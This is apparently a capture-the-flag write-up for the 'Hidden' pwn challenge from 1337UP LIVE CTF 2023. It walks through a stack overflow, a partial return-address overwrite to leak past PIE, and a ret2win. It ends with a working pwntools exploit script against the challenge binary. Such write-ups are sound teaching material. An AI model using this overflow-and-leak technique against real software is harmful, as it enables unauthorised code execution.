# Hidden

|||
|-|-|
|  **CTF**  |  [1337UP LIVE CTF 2023](https://ctf.intigriti.io/) [(CTFtime)](https://ctftime.org/event/2134)  |
|  **Author** |  0xM4hm0ud |
|  **Category** |  Pwn |
|  **Solves** |  111  |
|  **Difficulty** |  Easy |
| **Files** |  [hidden.zip](<hidden.zip>)  |

![image](https://github.com/0xM4hm0ud/MyCTFChallenges/assets/80924519/ba580f5b-9afe-43c0-a8cd-6732ff297568)

# Solution

When unzipping we get a binary. Lets check the protections:

![image](https://github.com/0xM4hm0ud/MyCTFChallenges/assets/80924519/713797de-a5f3-4f10-8b51-4035b0feac96)

So all protections enabled. 
We can check the main function and see that it calls the `input` function:

![image](https://github.com/0xM4hm0ud/MyCTFChallenges/assets/80924519/5c8b8ec0-e69f-4bac-a40d-eed8d61bdb35)

When we check the `input` function we see that there is no canary in this function. There is also a buffer overflow vulnerability. We can read 0x50 bytes into a buffer on the stack with a smaller size:

![image](https://github.com/0xM4hm0ud/MyCTFChallenges/assets/80924519/812cb37c-5339-4975-ab4f-46afc404a441)

There is also a win function called `_`:

![image](https://github.com/0xM4hm0ud/MyCTFChallenges/assets/80924519/8383955e-d42f-4aa1-8a69-217795d638c4)

So we can just overflow and jump to the win function, but because of PIE that is enabled we can't do this.
We need to leak. If we check close at the `input()` we can see that after the read call it prints our input with `puts`.
Puts reads till it find a null byte and because we have an overflow we can fill the entire buffer till the return address and leak the return address. 
But we also need to jump back so we need to overwrite the lsb of the return address(last 3 nibbels stays the same):

![image](https://github.com/0xM4hm0ud/MyCTFChallenges/assets/80924519/5769451c-4b3d-4a03-b34a-ddc9119bdd8a)

So when we jumped back to main with the leak we know the address of the win function. We then can do a normal ret2win to get the flag.

> solve.py
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
#context(terminal=['tmux', 'split-window', '-h'])

io = start()

payload = flat (
    b'A' * 72,
    p8(0x1a)
    )

io.sendafter(b':\n', payload)

io.recvuntil(b'A' * 72)
leak = u64(io.recvline()[:-1].ljust(8, b'\x00'))
elf.address = leak - 0x131a

log.success("Main address: %#x", leak)
log.success("Binary base: %#x", elf.address)

payload = flat (
    b'A' * 72,
    p64(elf.sym._)
    )

io.sendafter(b':\n', payload)
io.interactive()
```
 
